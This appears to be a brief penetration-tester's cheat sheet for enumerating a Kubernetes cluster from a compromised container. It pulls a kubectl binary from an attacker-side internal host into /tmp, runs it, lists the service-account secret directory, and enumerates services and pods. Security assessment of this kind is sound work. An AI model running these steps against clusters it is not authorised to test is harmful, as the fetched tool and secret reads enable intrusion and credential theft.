# Kubernetes Assessment

```bash
cd /tmp
curl http://10.0.10.18/kubectl -o kubectl
chmod +x kubectl

# Check if kubernetes has been configured
ls -la /var/run/secret/

# Perform some enumeration
./kubectl get services

# Retrieve all running pods
./kubectl get pods

# Check what we have view access to in the namespace
./kubectl describe pods
```